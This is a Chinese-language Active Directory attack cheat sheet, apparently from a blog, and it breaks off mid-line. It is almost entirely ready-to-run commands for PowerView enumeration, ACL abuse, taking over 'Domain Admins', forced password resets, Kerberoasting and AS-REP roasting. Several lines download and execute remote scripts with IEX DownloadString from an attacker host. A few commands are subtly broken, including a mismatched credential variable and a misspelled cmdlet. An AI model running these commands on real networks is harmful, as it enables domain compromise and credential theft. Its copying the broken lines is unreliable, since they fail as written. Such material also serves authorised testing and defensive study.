+<h3 id="01-PowerView​"><a href="#01-PowerView​" class="headerlink" title="01.PowerView​"></a>01.PowerView<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1">​</a></h3><ul>
+<li><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse">滥用 Active Directory ACL&#x2F;ACE</a></p>
+</li>
+<li><p>常见的</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 远程和本地加载脚本</span><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.10.14.26/PowerView.ps1&#x27;</span>)<br><span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br>. .\PowerView.ps1<br><br><span class="hljs-comment">## ------------------| 枚举当前域</span><br><span class="hljs-built_in">Get-Domain</span><br><span class="hljs-built_in">Get-Domain</span> <span class="hljs-literal">-Domain</span> &lt;DomainName&gt;<br><span class="hljs-built_in">Get-DomainSID</span><br><br><span class="hljs-comment">## ------------------| 枚举域控制器</span><br><span class="hljs-built_in">Get-DomainController</span> <br><span class="hljs-built_in">Get-DomainController</span> <span class="hljs-literal">-Domain</span> &lt;DomainName&gt;<br><br><span class="hljs-comment">## ------------------| 枚举域计算机</span><br><span class="hljs-built_in">Get-NetComputer</span><br><span class="hljs-built_in">Get-NetComputer</span> | <span class="hljs-built_in">select</span> name<br><span class="hljs-built_in">Get-NetComputer</span> | <span class="hljs-built_in">select</span> Name,operatingsystem<br><span class="hljs-built_in">Get-NetComputer</span> <span class="hljs-literal">-OperatingSystem</span> <span class="hljs-string">&quot;*Server 2016*&quot;</span> | <span class="hljs-built_in">select</span> name,operatingsystem<br><br><span class="hljs-comment">## ------------------| Enumerate Domain Users</span><br><span class="hljs-built_in">Get-DomainUser</span><br><span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> &lt;username&gt;<br><span class="hljs-built_in">Get-DomainUser</span> | <span class="hljs-built_in">select</span> cn<br><span class="hljs-built_in">Get-DomainUser</span> | <span class="hljs-built_in">select</span> samaccountname,logoncount,lastlogon<br><span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> &lt;username&gt; <span class="hljs-literal">-Properties</span> DisplayName, MemberOf,objectsid,useraccountcontrol | <span class="hljs-built_in">Format-List</span><br><br><span class="hljs-comment">## ------------------| Enumerate All Groups</span><br><span class="hljs-built_in">Get-NetGroup</span><br><span class="hljs-built_in">Get-NetGroup</span> | <span class="hljs-built_in">select</span> name<br><span class="hljs-built_in">Get-NetGroup</span> <span class="hljs-string">&#x27;Domain Admins&#x27;</span><br><span class="hljs-built_in">Get-NetGroup</span> <span class="hljs-string">&quot;*admin*&quot;</span>| <span class="hljs-built_in">select</span> name <br><span class="hljs-built_in">Get-NetGroup</span> <span class="hljs-literal">-Domain</span> &lt;targetdomain&gt; | <span class="hljs-built_in">select</span> name<br><span class="hljs-built_in">Get-NetGroupMember</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-Recurse</span> | <span class="hljs-built_in">select</span> MemberName<br><br><span class="hljs-comment">## ------------------| Enumerate Local Groups</span><br><span class="hljs-built_in">Get-NetLocalGroup</span> <br><span class="hljs-built_in">Get-NetLocalGroup</span> | <span class="hljs-built_in">Select-Object</span> GroupName<br><span class="hljs-built_in">Get-NetLocalGroup</span> <span class="hljs-literal">-ComputerName</span> &lt;computername&gt;<br><span class="hljs-built_in">Get-NetGroup</span> <span class="hljs-literal">-UserName</span> &lt;<span class="hljs-string">&quot;username&quot;</span>&gt;| <span class="hljs-built_in">select</span> name<br><span class="hljs-built_in">Get-NetGroupMember</span> <span class="hljs-literal">-MemberName</span> <span class="hljs-string">&quot;domain admins&quot;</span> <span class="hljs-literal">-Recurse</span> | <span class="hljs-built_in">select</span> MemberName<br><span class="hljs-built_in">Get-NetLocalGroupMember</span> <span class="hljs-literal">-GroupName</span> Administrators | <span class="hljs-built_in">Select-Object</span> MemberName, IsGroup, IsDomain<br><br><span class="hljs-comment">## ------------------| 枚举域策略</span><br><span class="hljs-built_in">Get-DomainPolicy</span><br>(<span class="hljs-built_in">Get-DomainPolicy</span>).<span class="hljs-string">&quot;SystemAccess&quot;</span><br>(<span class="hljs-built_in">Get-DomainPolicy</span>).<span class="hljs-string">&quot;kerberospolicy&quot;</span><br>(<span class="hljs-built_in">Get-DomainPolicy</span> <span class="hljs-literal">-domain</span> &lt;DomainName&gt;).<span class="hljs-string">&quot;SystemAccess&quot;</span><br><br><span class="hljs-comment">## ------------------| 枚举组策略[GPO]</span><br><span class="hljs-built_in">Get-NetGPO</span><br><span class="hljs-built_in">Get-NetGPO</span> | <span class="hljs-built_in">select</span> displayname<br><span class="hljs-built_in">Get-NetGPO</span> <span class="hljs-literal">-ComputerName</span> &lt;ComputeName&gt;<br><span class="hljs-built_in">Find-GPOComputerAdmin</span> <span class="hljs-literal">-ComputerName</span> &lt;ComputeName&gt;<br><span class="hljs-built_in">Find-GPOLocation</span> <span class="hljs-literal">-UserName</span> &lt;UserName&gt; <span class="hljs-literal">-Verbose</span><br><br><span class="hljs-comment">## ------------------| 枚举组织单位[OU]</span><br><span class="hljs-built_in">Get-NetOU</span><br><span class="hljs-built_in">Get-NetOU</span> | <span class="hljs-built_in">select</span> distinguishedname<br><br><span class="hljs-comment">## ------------------| Enumerate ACL</span><br><span class="hljs-built_in">Invoke-ACLScanner</span> <span class="hljs-literal">-ResolveGUIDs</span> <span class="hljs-comment"># Time-consuming</span><br><span class="hljs-built_in">Get-ObjectAcl</span> <span class="hljs-literal">-Identity</span> &lt;UserName&gt; <span class="hljs-literal">-ResolveGUIDs</span><br><span class="hljs-built_in">Get-ObjectAcl</span> <span class="hljs-literal">-SamAccountName</span> &lt;UserName&gt; <span class="hljs-literal">-ResolveGUIDs</span> <br><span class="hljs-built_in">Get-ObjectAcl</span> <span class="hljs-literal">-SamAccountName</span> &lt;UserName&gt; <span class="hljs-literal">-ResolveGUIDs</span> | <span class="hljs-built_in">select</span> ObjectDN,ActiveDirectoryRights | <span class="hljs-built_in">fl</span><br><br><span class="hljs-comment">## ------------------| 枚举域信任</span><br><span class="hljs-built_in">Get-DomainTrust</span><br><span class="hljs-built_in">Get-DomainTrust</span> <span class="hljs-literal">-Domain</span> &lt;FQDN&gt;<br><br><span class="hljs-comment">## ------------------| 枚举域林</span><br><span class="hljs-built_in">Get-Forest</span><br><span class="hljs-built_in">Get-ForestTrust</span><br><span class="hljs-built_in">Get-ForestDomain</span><br><span class="hljs-built_in">Get-ForestGlobalCatalog</span><br><span class="hljs-built_in">Get-Forest</span> <span class="hljs-literal">-Forest</span> &lt;Domain&gt;<br><span class="hljs-built_in">Get-ForestTrust</span> <span class="hljs-literal">-Forest</span> &lt;Domain&gt;<br><span class="hljs-built_in">Get-ForestDomain</span> <span class="hljs-literal">-Forest</span> &lt;Domain&gt;<br><span class="hljs-built_in">Get-ForestGlobalCatalog</span>  <span class="hljs-literal">-Forest</span> &lt;Domain&gt;<br><br><span class="hljs-comment">## ------------------| List Domain or File Shares.</span><br><span class="hljs-built_in">Find-DomainShare</span><br><span class="hljs-built_in">Get-NetFileServer</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Invoke-ShareFinder</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Find-DomainShare</span> <span class="hljs-literal">-CheckShareAccess</span><br><br><span class="hljs-comment">## ------------------| 在域中的计算机上查找敏感文件</span><br><span class="hljs-built_in">Invoke-FileFinder</span> <span class="hljs-literal">-Verbose</span><br><br><span class="hljs-comment">## ------------------| Request TGS</span><br><span class="hljs-built_in">Request-SPNTicket</span> <br><br><span class="hljs-comment">## ------------------| 将SID值转换为名称</span><br><span class="hljs-string">&quot;SID&gt;&quot;</span> | <span class="hljs-built_in">Convert-SidToName</span><br><br><span class="hljs-comment">## ------------------| Kerberoast</span><br><span class="hljs-built_in">Invoke-Kerberoast</span><br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-Identity</span> &lt;UserName&gt;<br><br><span class="hljs-comment">## ------------------| 模拟用户</span><br><span class="hljs-variable">$pass</span>= <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Password123!&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;&lt;Domain&gt;\&lt;User&gt;&#x27;</span>, <span class="hljs-variable">$pass</span>)<br><span class="hljs-built_in">Invoke-UserImpersonation</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br><span class="hljs-built_in">Invoke-RevertToSelf</span><br><br><span class="hljs-comment">## ------------------| 特殊枚举</span><br><span class="hljs-comment">## 查找当前帐户具有本地管理员访问权限的域上的所有计算机</span><br><span class="hljs-built_in">Find-LocalAdminAccess</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-comment">## 噪音很大</span><br><span class="hljs-built_in">Invoke-EnumerateLocalAdmin</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-comment">## 需要管理员权限</span><br><br><span class="hljs-comment">## 列出所有已登录/处于活动状态的用户</span><br><span class="hljs-built_in">Get-NetLoggedon</span><br><span class="hljs-built_in">Get-NetLoggedon</span> <span class="hljs-literal">-ComputerName</span> &lt;TargetMachineName&gt; | <span class="hljs-built_in">Format-Table</span> <span class="hljs-literal">-AutoSize</span><br><span class="hljs-built_in">Get-NetSessiom</span> <span class="hljs-literal">-ComputerName</span> &lt;DCName&gt; | <span class="hljs-built_in">Format-Table</span> <span class="hljs-literal">-AutoSize</span><br><br><span class="hljs-comment">## 列出所有服务帐户[SPN]</span><br><span class="hljs-built_in">Get-NetUser</span> –SPN<br><span class="hljs-built_in">Get-NetUser</span> | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.servicePrincipalName&#125; | <span class="hljs-built_in">select</span> samaccountname,serviceprincipalname | <span class="hljs-built_in">fl</span><br><br><span class="hljs-comment">## 列出禁用Kerberos预身份验证的所有帐户[AS-REP Roasting]</span><br><span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-PreauthNotRequired</span> <span class="hljs-literal">-Verbose</span><br><br><span class="hljs-comment">## 查找所有具有会话的计算机</span><br><span class="hljs-built_in">Invoke-UserHunter</span> <br><span class="hljs-built_in">Invoke-UserHunter</span> <span class="hljs-literal">-Stealth</span> <span class="hljs-comment">## 仅针对高价值机器</span><br><span class="hljs-built_in">Invoke-UserHunter</span> <span class="hljs-literal">-CheckAccess</span><br><span class="hljs-built_in">Invoke-UserHunter</span> <span class="hljs-literal">-GroupName</span> <span class="hljs-string">&quot;Domain Admins&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>滥用<strong>WriteOwner</strong> &#x2F; 写入所有者</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 更改所有者</span><br><span class="hljs-built_in">Set-DomainObjectOwner</span> <span class="hljs-literal">-Identity</span> &lt;User1&gt; <span class="hljs-literal">-OwnerIdentity</span> &lt;User2&gt;<br><br><span class="hljs-comment">## ------------------| 更改权限以重置密码</span><br><span class="hljs-built_in">Add-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> Herman <span class="hljs-literal">-PrincipalIdentity</span> nico <span class="hljs-literal">-Rights</span> ResetPassword <span class="hljs-literal">-Verbose</span>  <br><span class="hljs-comment"># PoweShell命令中列出了密码更改 👆👆</span><br><br><span class="hljs-comment"># ------------------| 更改组的所有权</span><br><span class="hljs-comment">## 信誉不是必须的，但是。。。</span><br><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;W3llcr4ft3d_4cls&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;object.local\maria&#x27;</span>, <span class="hljs-variable">$SecPassword</span>)<br><span class="hljs-comment">## 更改“Domain Admins”组的所有权</span><br><span class="hljs-built_in">Set-DomainObjectOwner</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-OwnerIdentity</span> maria<br><span class="hljs-comment">## 把所有权利都交给玛丽亚</span><br><span class="hljs-built_in">Add-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> maria <span class="hljs-literal">-Rights</span> All<br><span class="hljs-comment">## Maria可以将自己添加到组中</span><br><span class="hljs-built_in">Add-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&#x27;Domain Admins&#x27;</span> <span class="hljs-literal">-Members</span> <span class="hljs-string">&#x27;maria&#x27;</span><br><span class="hljs-comment">## 或网络组“Domain Admins”maria/add/Domain</span><br>net user maria<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>滥用<strong>强制更改密码</strong></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Reset password</span><br><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Password123!&#x27;</span> <span class="hljs-literal">-asPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Set-DomainUserPassword</span> &lt;UserName&gt; <span class="hljs-literal">-AccountPassword</span> <span class="hljs-variable">$pass</span> <span class="hljs-literal">-Verbose</span><br><br><span class="hljs-comment">## ------------------| 如果你在AD上，简单的Powershell</span><br><span class="hljs-built_in">Set-ADAccountPassword</span> <span class="hljs-literal">-Identity</span> &lt;UserName&gt; <span class="hljs-literal">-Reset</span> <span class="hljs-literal">-NewPassword</span> (<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-string">&quot;Password123!&quot;</span> <span class="hljs-literal">-Force</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>滥用<strong>GenericAll</strong></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 将成员添加到另一个组</span><br><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Password123!&#x27;</span> <span class="hljs-literal">-asPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;HTB\Herman&#x27;</span>,<span class="hljs-variable">$pass</span>)<br><span class="hljs-built_in">Add-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&#x27;Backup_Admins&#x27;</span> <span class="hljs-literal">-Members</span> Herman <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br><span class="hljs-built_in">Get-DomainGroup</span> <span class="hljs-literal">-MemberIdentity</span> Herman | <span class="hljs-built_in">select</span> samaccountname<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>滥用<strong>GenericWrite</strong> &#x2F; 通用写入</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Setup</span><br><span class="hljs-comment">## The cred isn’t necessary but...</span><br><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Password123!&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;&lt;Domain&gt;\&lt;UserName&gt;&#x27;</span>, <span class="hljs-variable">$pass</span>)<br><br><span class="hljs-comment">## ------------------| Method I</span><br><span class="hljs-comment">## 设置一个服务主体名称并对该帐户进行kerberast。</span><br><span class="hljs-comment">## 要真正Kerberoast，我们需要使用具有有效格式的SPN，如MSSQLSvc/＜Domain＞：1433</span><br><span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Identity</span> &lt;UserNameToSetSPN&gt; <span class="hljs-literal">-SET</span> <span class="hljs-selector-tag">@</span>&#123;serviceprincipalname=<span class="hljs-string">&#x27;MSSQLSvc/&lt;Domain&gt;:1433&#x27;</span>&#125;<br><span class="hljs-comment">## 我们可以使用内置二进制 : setspn -a MSSQLSvc/&lt;Domain&gt;:1433 &lt;Domain&gt;\&lt;UserName&gt;</span><br><span class="hljs-comment">## With creds : Set-DomainObject -Credential $cred -Identity &lt;UserNameToSetSPN&gt; -SET @&#123;serviceprincipalname=&#x27;MSSQLSvc/&lt;Domain&gt;:1433&#x27;&#125;        </span><br><span class="hljs-built_in">Get-DomainUser</span> &lt;UserNameToSetSPN&gt; | <span class="hljs-built_in">Select</span> serviceprincipalname<br><span class="hljs-built_in">Get-DomainSPNTicket</span> <span class="hljs-literal">-SPN</span> <span class="hljs-string">&quot;MSSQLSvc/&lt;Domain&gt;:1433&quot;</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> | <span class="hljs-built_in">fl</span><br>.\Rubeus.exe kerberoast /creduser:&lt;Domain&gt;\&lt;UserName&gt; /credpassword:Password123!<br><br><span class="hljs-comment">## ------------------| Method II</span><br><span class="hljs-comment">## 设置登录脚本</span><br><span class="hljs-built_in">cd</span> C:\Windows\temp\<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;whoami &gt; C:\\Windows\\temp\\poc.txt&#x27;</span> &gt; foo.ps1<br><span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-Identity</span> &lt;UserName&gt; <span class="hljs-literal">-SET</span> <span class="hljs-selector-tag">@</span>&#123;scriptpath=<span class="hljs-string">&#x27;C:\\Windows\\temp\\\\foo.ps1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>滥用<strong>AddKeyCredentialLink</strong></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Setup</span><br><span class="hljs-built_in">wget</span> https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.<span class="hljs-number">7</span>_Any/Whisker.exe<br>.\Whisker.exe add /target:&lt;UserName&gt;<br><span class="hljs-comment">## 然后运行Rubeus命令并获取NTLM哈希</span><br>evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> &lt;IP&gt; <span class="hljs-literal">-u</span> &lt;UserName&gt; <span class="hljs-literal">-H</span> &lt;Hash&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="02-获取ADUsers"><a href="#02-获取ADUsers" class="headerlink" title="02.获取ADUsers"></a>02.<strong>获取ADUsers</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">impacket<span class="hljs-literal">-GetADUsers</span> <span class="hljs-literal">-all</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; &lt;domain&gt;/&lt;user&gt;<br>impacket<span class="hljs-literal">-GetADUsers</span> <span class="hljs-literal">-all</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; &lt;domain&gt;/&lt;user&gt; <span class="hljs-literal">-hashes</span> &lt;LM:NT&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="03-获取用户SPN-KerBeros-Roasting"><a href="#03-获取用户SPN-KerBeros-Roasting" class="headerlink" title="03.获取用户SPN &#x2F;  KerBeros Roasting"></a>03.<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/fortra/impacket/master/examples/GetUserSPNs.py"><strong>获取用户SPN</strong></a> &#x2F;  KerBeros Roasting</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 没有密码</span><br>impacket<span class="hljs-literal">-GetUserSPNs</span> <span class="hljs-literal">-request</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; &lt;domain&gt;/&lt;user&gt; <span class="hljs-literal">-no-pass</span><br><br><span class="hljs-comment">## ------------------| 带密码</span><br>impacket<span class="hljs-literal">-GetUserSPNs</span> <span class="hljs-literal">-request</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;<br>impacket<span class="hljs-literal">-GetUserSPNs</span> <span class="hljs-literal">-request</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; &lt;domain&gt;/&lt;user&gt; <span class="hljs-literal">-hashes</span> &lt;LM:NT&gt;<br><br><span class="hljs-comment">## ------------------| 使用Kerberos身份验证。从ccache文件中抓取凭据</span><br>impacket<span class="hljs-literal">-GetUserSPNs</span> <span class="hljs-literal">-request</span> <span class="hljs-literal">-k</span> <span class="hljs-literal">-no-pass</span> <span class="hljs-literal">-dc-host</span> dc1.scrm.local scrm.local/ksimpson<br></code></pre></td></tr></table></figure>
+
+<h3 id="04-获取NPUsers-AS-Rep-Roasting"><a href="#04-获取NPUsers-AS-Rep-Roasting" class="headerlink" title="04.获取NPUsers &#x2F; AS-Rep Roasting"></a>04.获取NPUsers &#x2F; AS-Rep Roasting</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 检查是否禁用Kerberos预身份验证？</span><br>impacket<span class="hljs-literal">-GetNPUsers</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; &lt;domain&gt;/&lt;user&gt; <span class="hljs-literal">-no-pass</span>    <br>impacket<span class="hljs-literal">-GetNPUsers</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-no-pass</span> <span class="hljs-literal">-usersfile</span> /usr/share/seclists/Usernames/Names/names.txt &lt;domain&gt;/     <br><br><span class="hljs-comment">## ------------------| 常用方法 </span><br>impacket<span class="hljs-literal">-GetNPUsers</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-request</span> <span class="hljs-string">&#x27;&lt;domain&gt;/&#x27;</span><br>impacket<span class="hljs-literal">-GetNPUsers</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-request</span> &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<br>impacket<span class="hljs-literal">-GetNPUsers</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-request</span> &lt;domain&gt;/&lt;username&gt; <span class="hljs-literal">-hashes</span> &lt;LM:NT&gt;<br><br><span class="hljs-comment">## ------------------| 获取hashcat格式</span><br>impacket<span class="hljs-literal">-GetNPUsers</span> <span class="hljs-literal">-format</span> hashcat <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-request</span> <span class="hljs-string">&#x27;&lt;domain&gt;/&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="05-BloodHound-SharpHound"><a href="#05-BloodHound-SharpHound" class="headerlink" title="05.**BloodHound &#x2F; SharpHound"></a>05.**BloodHound &#x2F; SharpHound</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound">锐利猎犬</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Load ShapHound.ps1</span><br><span class="hljs-comment">## 如果您使用的是Powershell脚本，则需要下载BloodHound 4.0.3版本</span><br><span class="hljs-comment">## https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/BloodHoundAD/BloodHound/d8163c0650ada9ef4a6ebc5e2dc8f5fde566e73f/Collectors/SharpHound.ps1      <br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://&lt;IP&gt;/SharpHound.ps1&#x27;</span>)<br><span 